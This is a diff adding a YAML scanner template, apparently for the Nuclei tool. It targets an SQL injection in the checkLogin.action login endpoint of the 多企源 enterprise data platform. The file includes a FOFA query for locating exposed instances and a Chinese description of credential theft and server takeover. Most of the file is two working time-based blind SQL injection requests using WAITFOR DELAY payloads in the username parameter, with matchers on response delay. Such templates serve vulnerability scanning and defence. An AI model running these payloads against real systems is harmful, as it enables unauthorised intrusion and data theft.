@@ -1,0 +1,31 @@
+id: duoqiyuan-data-platform-checklogin-sql
+info:
+  name: "多企源-基础数据支撑系统 checkLogin.action 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    ffoa: app="多企源-基础数据支撑系统"
+        该系统作为企业级数据整合平台，通过多源数据接入实现统一存储与管理。其checkLogin.action接口在参数校验机制中存在SQL语法解析缺陷，攻击者可通过构造恶意输入执行任意SQL语句。该漏洞允许未经授权的访问者获取数据库结构信息，读取敏感数据（如管理员凭证、用户隐私信息），在具备操作系统写权限条件下可部署恶意程序，最终可能导致服务器控制权沦陷。
+  tags: 多企源
+http:
+- raw:
+  - |
+    POST /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: zh-CN
+    Connection: keep-alive
+  - |
+    POST /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: zh-CN
+    Connection: keep-alive
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
